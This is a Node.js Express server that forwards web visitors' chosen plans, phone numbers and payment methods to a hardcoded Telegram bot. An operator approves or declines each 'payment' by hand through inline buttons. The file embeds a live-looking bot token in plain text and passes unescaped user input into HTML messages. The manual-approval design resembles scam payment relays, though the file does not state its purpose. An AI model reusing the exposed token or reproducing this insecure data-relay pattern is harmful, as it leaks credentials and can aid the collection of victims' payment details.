const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ==================== TELEGRAM BOT CONFIG ====================
const BOT_TOKEN = '8883385216:AAFj6cjQmV9kd7-wf6EZcSnlhuvLlO-PI88';
const CHAT_ID = '8889432014';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// In-memory store for payment sessions
const sessions = {};

// Generate unique session ID
function generateSessionId() {
    return 'TXN' + Date.now() + Math.random().toString(36).substr(2, 6).toUpperCase();
}

// Send Telegram message
async function sendTelegramMessage(text, replyMarkup = null) {
    const payload = {
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML'
    };
    if (replyMarkup) {
        payload.reply_markup = JSON.stringify(replyMarkup);
    }
    
    try {
        const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();
        return data;
    } catch (err) {
        console.error('Telegram send error:', err);
        return null;
    }
}

// Answer callback query (removes loading state from button)
async function answerCallbackQuery(callbackQueryId, text) {
    try {
        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
                text: text
            })
        });
    } catch (err) {
        console.error('Answer callback error:', err);
    }
}

// Edit message after action
async function editTelegramMessage(messageId, newText) {
    try {
        await fetch(`${TELEGRAM_API}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                message_id: messageId,
                text: newText,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Edit message error:', err);
    }
}

// ==================== TELEGRAM LONG POLLING ====================
// This runs automatically - no webhook URL needed!

let pollingOffset = 0;

async function pollTelegram() {
    try {
        const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${pollingOffset}&timeout=30`, {
            method: 'GET'
        });
        const data = await res.json();

        if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
                pollingOffset = update.update_id + 1;

                if (update.callback_query) {
                    const callbackData = update.callback_query.data;
                    const callbackQueryId = update.callback_query.id;
                    const messageId = update.callback_query.message.message_id;

                    if (callbackData.startsWith('approve_')) {
                        const sessionId = callbackData.replace('approve_', '');
                        if (sessions[sessionId]) {
                            sessions[sessionId].status = 'approved';
                            await answerCallbackQuery(callbackQueryId, '✅ Payment Approved!');
                            await editTelegramMessage(messageId,
                                `✅ <b>PAYMENT APPROVED</b>\n\n` +
                                `📦 Plan: <b>${sessions[sessionId].planName}</b>\n` +
                                `💰 Amount: <b>${sessions[sessionId].planPrice}</b>\n` +
                                `📱 Phone: <b>${sessions[sessionId].phoneNumber}</b>\n` +
                                `🆔 Session: <code>${sessionId}</code>\n\n` +
                                `✅ Status: <b>APPROVED</b>`
                            );
                        }
                    } else if (callbackData.startsWith('decline_')) {
                        const sessionId = callbackData.replace('decline_', '');
                        if (sessions[sessionId]) {
                            sessions[sessionId].status = 'declined';
                            await answerCallbackQuery(callbackQueryId, '❌ Payment Declined!');
                            await editTelegramMessage(messageId,
                                `❌ <b>PAYMENT DECLINED</b>\n\n` +
                                `📦 Plan: <b>${sessions[sessionId].planName}</b>\n` +
                                `💰 Amount: <b>${sessions[sessionId].planPrice}</b>\n` +
                                `📱 Phone: <b>${sessions[sessionId].phoneNumber}</b>\n` +
                                `🆔 Session: <code>${sessionId}</code>\n\n` +
                                `❌ Status: <b>DECLINED</b>`
                            );
                        }
                    }
                }
            }
        }
    } catch (err) {
        console.error('Polling error:', err.message);
    }

    // Continue polling
    pollTelegram();
}

// Remove any existing webhook and start polling
async function startPolling() {
    try {
        // Delete webhook so polling works
        await fetch(`${TELEGRAM_API}/deleteWebhook`);
        console.log('✅ Telegram polling started - No webhook URL needed!');
        console.log('✅ You will receive notifications on Telegram automatically.');
        pollTelegram();
    } catch (err) {
        console.error('Failed to start polling:', err);
    }
}

// ==================== API ENDPOINTS ====================

// 1. Notify when someone selects a plan
app.post('/api/notify-plan', async (req, res) => {
    const { planName, planPrice } = req.body;
    
    const message = `🔔 <b>NEW VISITOR</b>\n\n` +
        `Someone is viewing a plan:\n` +
        `📦 Plan: <b>${planName}</b>\n` +
        `💰 Price: <b>${planPrice}</b>\n` +
        `⏰ Time: ${new Date().toLocaleString('en-UG', { timeZone: 'Africa/Kampala' })}`;
    
    await sendTelegramMessage(message);
    res.json({ success: true });
});

// 2. Create payment session and send approval request to Telegram
app.post('/api/request-approval', async (req, res) => {
    const { planName, planPrice, phoneNumber, paymentMethod } = req.body;
    
    const sessionId = generateSessionId();
    sessions[sessionId] = {
        status: 'pending',
        planName,
        planPrice,
        phoneNumber,
        paymentMethod,
        createdAt: Date.now()
    };
    
    const message = `💳 <b>PAYMENT APPROVAL REQUEST</b>\n\n` +
        `📦 Plan: <b>${planName}</b>\n` +
        `💰 Amount: <b>${planPrice}</b>\n` +
        `📱 Phone: <b>${phoneNumber}</b>\n` +
        `🏦 Method: <b>${paymentMethod}</b>\n` +
        `🆔 Session: <code>${sessionId}</code>\n` +
        `⏰ Time: ${new Date().toLocaleString('en-UG', { timeZone: 'Africa/Kampala' })}\n\n` +
        `⚡ Choose action below:`;
    
    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ APPROVE', callback_data: `approve_${sessionId}` },
                { text: '❌ DECLINE', callback_data: `decline_${sessionId}` }
            ]
        ]
    };
    
    await sendTelegramMessage(message, replyMarkup);
    res.json({ success: true, sessionId });
});

// 3. Check payment status (polled by frontend)
app.get('/api/check-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions[sessionId];
    
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    
    res.json({ status: session.status });
});

// Clean up old sessions (older than 10 minutes)
setInterval(() => {
    const now = Date.now();
    for (const id in sessions) {
        if (now - sessions[id].createdAt > 600000) {
            delete sessions[id];
        }
    }
}, 60000);

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`🌐 Open http://localhost:${PORT} in your browser\n`);
    
    // Start Telegram polling automatically
    startPolling();
});
